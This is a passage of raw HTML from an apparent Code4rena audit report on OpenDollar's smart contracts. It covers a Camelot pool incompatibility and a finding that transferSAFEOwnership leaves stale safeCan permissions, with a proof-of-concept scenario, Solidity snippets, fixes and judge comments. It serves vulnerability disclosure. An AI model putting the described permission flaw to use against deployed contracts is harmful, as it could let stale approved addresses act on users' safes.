class=\"mtk1\">).</span><span class=\"mtk11\">observations</span><span class=\"mtk1\">((</span><span class=\"mtk12\">observationIndex</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) % </span><span class=\"mtk12\">observationCardinality</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The next index might not be initialized if the cardinality is in the process of increasing</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// In this case the oldest observation is always in index 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;      (</span><span class=\"mtk12\">observationTimestamp</span><span class=\"mtk1\">, , , ) = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">observations</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">secondsAgo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">observationTimestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">consult</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">secondsAgo</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">arithmeticMeanTick</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">harmonicMeanLiquidity</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">secondsAgo</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;BP&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">secondsAgos</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">secondsAgos</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">secondsAgo</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">secondsAgos</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">int56</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tickCumulatives</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint160</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">secondsPerLiquidityCumulativeX128s</span><span class=\"mtk1\">) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;      </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">observe</span><span class=\"mtk1\">(</span><span class=\"mtk12\">secondsAgos</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol#L74\">https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol#L74</a></p>\n<p><a href=\"https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol#L16\">https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/libraries/OracleLibrary.sol#L16</a></p>\n<p>However, the functions <code>slot0</code>, <code>observations</code>, and <code>observe</code> do not exist in Camelot’s Pool. I found Camelot’s pool through CAMELOT_V3_FACTORY (0x1a3c9B1d2F0529D97f2afC5136Cc23e58f1FD35B) at <a href=\"https://github.com/open-dollar/od-contracts/blob/v1.5.5-audit/script/Registry.s.sol#L58\">Registry.s.sol</a>.</p>\n<p>If you call <code>poolDeployer</code> view function at CAMELOT_V3_FACTORY, it returns <a href=\"https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65\">0x6Dd3FB9653B10e806650F107C3B5A0a6fF974F65</a>, and you can see the Pool code in this contract. <a href=\"https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65#code\">https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65#code</a></p>\n<h3 id=\"recommended-mitigation-steps-15\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-15\" aria-label=\"recommended mitigation steps 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Don’t use Uniswap V3 OracleLibrary for Camelot. You need to implement your own logic to communicate with the Camelot pool. These are functions/variables in Camelot pool that are similar to Uniswap V3 Pool’s.</p>\n<ul>\n<li><code>slot0</code> →  <code>globalState</code> : <a href=\"https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65#code#F15#L24\">https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65#code#F15#L24</a></li>\n<li>\n<p><code>observations</code> → <code>timepoints</code> : <a href=\"https://arbiscan.io/address/0x1a3c9B1d2F0529D97f2afC5136Cc23e58f1FD35B#code#F3#L22\">https://arbiscan.io/address/0x1a3c9B1d2F0529D97f2afC5136Cc23e58f1FD35B#code#F3#L22</a></p>\n<ul>\n<li>DataStorage is deployed at <code>createPool</code> and attached at new pool. <a href=\"https://arbiscan.io/address/0x1a3c9B1d2F0529D97f2afC5136Cc23e58f1FD35B#code#F1#L67\">https://arbiscan.io/address/0x1a3c9B1d2F0529D97f2afC5136Cc23e58f1FD35B#code#F1#L67</a></li>\n</ul>\n</li>\n<li><code>observe</code> → <code>getTimepoints</code>  <a href=\"https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65#code#F3#L176\">https://arbiscan.io/address/0x6dd3fb9653b10e806650f107c3b5a0a6ff974f65#code#F3#L176</a></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/75\">pi0neerpat (OpenDollar) confirmed via duplicate issue 75</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/156#issuecomment-1790064695\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how the implementation of <code>CamelotRelayer.sol</code> is incompatible with Camelot pools, thereby breaking the functionality of the contract. Since there isn’t any loss of funds, medium severity is appropriate.</p>\n<p>This report was selected as best since its recommended mitigation is the most detailed.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-15-transfersafeownership-does-not-fully-transfer-ownership\" style=\"position:relative;\"><a href=\"#m-15-transfersafeownership-does-not-fully-transfer-ownership\" aria-label=\"m 15 transfersafeownership does not fully transfer ownership permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/142\">[M-15] <code>transferSAFEOwnership()</code> does not fully transfer ownership</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/142\">lsaudit</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/448\">klau5</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/443\">twicek</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/393\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/188\">0xPsuedoPandit</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/133\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/440\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/161\">Stormreckson</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/41\">ZanyBonzy</a></em></p>\n<p>Function <code>transferSAFEOwnership()</code> is only callable by <code>Only Vault721</code>: <code>require(msg.sender == address(vault721), 'SafeMngr: Only Vault721');</code> and its purpose is to give the safe ownership to a <code>dst</code> address.\nHowever, <code>transferSAFEOwnership()</code> does not reset <code>safeCan</code> mapping which is used by <code>safeAllowed</code> modifier.</p>\n<p>This leads to some security issues. The modifier <code>safeAllowed</code> is used to verify if user has permission to the safe. Multiple of functions which perform critical operations on the safe use this modifier to verify is user has permission to call that operation on a given safe.</p>\n<p>Since <code>transferSAFEOwnership()</code> transfer ownership to a different address, it should also reset all previously set privileges by the previous owner. However, <code>safeCan</code> mapping is not being reset in <code>transferSAFEOwnership()</code></p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Firstly, let’s take a look how <code>safeAllowed</code> modifier is defined:</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L49-L53\">File: ODSafeManager.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  modifier safeAllowed(uint256 _safe) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _owner = _safeData[_safe].owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender != _owner &amp;&amp; safeCan[_owner][_safe][msg.sender] == 0) revert SafeNotAllowed();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>For this PoC, let’s consider user <code>A</code>, who’s the owner of safe 123.<br>\nHe gives access to the safe to <code>X</code>, <code>Y</code>, so he calls:<br>\n<code>allowSAFE(123, X, 1), allowSAFE(123, Y, 1)</code>;</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L49-L53\">File: ODSafeManager.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"> function allowSAFE(uint256 _safe, address _usr, uint256 _ok) external safeAllowed(_safe) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address _owner = _safeData[_safe].owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    safeCan[_owner][_safe][_usr] = _ok;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit AllowSAFE(msg.sender, _safe, _usr, _ok);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>After calling this function, <code>safeCan</code> mapping looks like this: <code>safeCan[A][123][X] = 1</code> and <code>safeCan[A][123][Y] = 1</code>.</p>\n<p>Now, there’s a call to transfer safe ownership to <code>_dst</code> B: <code>transferSAFEOwnership(123, B)</code>.</p>\n<p><a href=\"https://github.com/open-dollar/od-contracts/blob/f4f0246bb26277249c1d5afe6201d4d9096e52e6/src/contracts/proxies/ODSafeManager.sol#L49-L53\">File: ODSafeManager.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function transferSAFEOwnership(uint256 _safe, address _dst) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(msg.sender == address(vault721), &#39;SafeMngr: Only Vault721&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_dst == address(0)) revert ZeroAddress();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SAFEData memory _sData = _safeData[_safe];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_dst == _sData.owner) revert AlreadySafeOwner();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _usrSafes[_sData.owner].remove(_safe);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _usrSafesPerCollat[_sData.owner][_sData.collateralType].remove(_safe);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _usrSafes[_dst].add(_safe);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _usrSafesPerCollat[_dst][_sData.collateralType].add(_safe);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _safeData[_safe].owner = _dst;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit TransferSAFEOwnership(msg.sender, _safe, _dst);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>It modifies only <code>_usrSafes</code>, <code>_usrSafesPerCollat</code> and  <code>_safeData</code> mappings and does not modify <code>safeCan</code> mapping.\nAfter <code>transferSAFEOwnership(123, B)</code> call, those mappings look like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">_usrSafes[B] = [123]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_usrSafesPerCollat[B][_sData.collateralType] = [123]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">_safeData[123].owner = B;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">safeCan[A][123][X]  // notice this is from previous allowSAFE() call</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">safeCan[A][123][Y]  // notice this is from previous allowSAFE() call</span></span></code></pre>\n<p>Now, at some point in the future, the safe goes back to user A. Function <code>transferSAFEOwnership()</code> is being called once again: <code>transferSAFEOwnership(123, A)</code>.</p>\n<p>User <code>A</code> get access to the safe. However, he does not remember that he previously sets access to users <code>X</code> and <code>Y</code>. Those mappings:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">safeCan[A][123][X]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">safeCan[A][123][Y]</span></span></code></pre>\n<p>are still there - meaning that <code>X</code> and <code>Y</code> has still access to that safe, even though the safe was just transferred back to <code>A</code> and safe’s permissions should be cleared.</p>\n<p>Now, when user <code>X</code> or <code>Y</code> will try to call any function with <code>safeAllowed</code> modifier - they will be allowed, since <code>safeAllowed</code> will return true for them, because <code>X</code> and <code>Y</code> are still in <code>safeCan</code> mapping.</p>\n<h3 id=\"recommended-mitigation-steps-16\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-16\" aria-label=\"recommended mitigation steps 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Whenever transfer ownership - make sure to reset <code>safeCan[old_owner][safe]</code> mapping.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/142#issuecomment-1783599545\">pi0neerpat (OpenDollar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Agreed, we would expect that permissions on a safe are cleared upon transfer. It would be unexpected for permissions to persist through such transfers, even if you received back a safe you previously owned.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/142#issuecomment-1790238191\">MiloTruck (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has demonstrated how <code>transferSAFEOwnership()</code> does not clear safe permissions in <code>safeCan</code>, which will cause previously “approved” addresses to still have access under the following conditions:</p>\n<ul>\n<li>An owner regains ownership of the safe after transferring it away. </li>\n<li>The previously “approved” address becomes malicious.</li>\n<li>The owner does not call <code>allowSAFE()</code> beforehand to remove the “approved” address.</li>\n</ul>\n<p>This is unintended functionality, but given that it requires multiple unlikely conditions for this to become a problem, I believe medium severity is appropriate.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 25 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/140\">report highlighted below</a> by <strong>MrPotatoMagic</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/385\">hals</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/221\">phoenixV110</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/175\">immeas</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/169\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/130\">mrudenko</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/426\">0xMosh</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/417\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/392\">okolicodes</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/345\">0xhacksmithh</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/328\">Baki</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/320\">spark</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/300\">twicek</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/274\">m4k2</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/261\">fibonacci</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/255\">Al-Qa-qa</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/246\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/200\">Bughunter101</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/192\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/185\">0xPsuedoPandit</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/122\">Stormreckson</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/120\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/110\">8olidity</a>, <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/80\">Krace</a>, and <a href=\"https://github.com/code-423n4/2023-10-opendollar-findings/issues/69\">eeshenggoh</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th>QA issues</th>\n<th>Issues</th>\n<th>Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[L-01]</td>\n<td>Image field does not point to an image but the testnet website</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[L-02]</td>\n<td>Missing check in constructor to see if quotePeriod is not zero</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[L-03]</td>\n<td>Missing cardinality check in function read()</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[L-04]</td>\n<td>Rounding down in <code>_exitCollateral()</code> function can cause loss of precision leading to loss of funds for users</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[N-01]</td>\n<td>Remove redundant condition in <code>_isNotProxy()</code> function.</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[N-02]</td>\n<td>Remove <code>if (_dst == address(0)) revert ZeroAddress();</code> redundant check since it is already checked in <code>_afterTokenTransfer()</code> function</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[N-03]</td>\n<td>Function read() does not revert with “OLD!” as mentioned in comments</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[N-04]</td>\n<td>Remove <code>if (extraSurplusReceiver == address(0)) revert AccEng_NullSurplusReceiver();</code> redundant check</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[R-01]</td>\n<td>Consider modifying the build() function which allows anyone to create an ODProxy for any user</td>\n<td>1</td>\n</tr>\n<tr>\n<td>[R-02]</td>\n<td>Use <code>user</code> instead of <code>usr</code> in mappings to improve readability</td>\n<td>2</td>\n</tr>\n<tr>\n<td>[R-03]</td>\n<td>Use <code>safeAllow</code> and <code>handlerAllow</code> instead of <code>safeCan</code> and <code>handlerCan</code> to better match the intention of the mappings</td>\n<td>2</td>\n</tr>\n<tr>\n<td>[R-04]</td>\n<td>Add brackets around <code>10 ** multiplier</code> to improve code readability and provide clarity in which operation takes precedence first</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Note: N = Non-Critical, L = Low-severity, R = Recommendation</strong></p>\n<h2 id=\"l-01-image-field-does-not-point-to-an-image-but-the-testnet-website\" style=\"position:relative;\"><a href=\"#l-01-image-field-does-not-point-to-an-image-but-the-testnet-website\" aria-label=\"l 01 image field does not point to an image but the testnet website permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 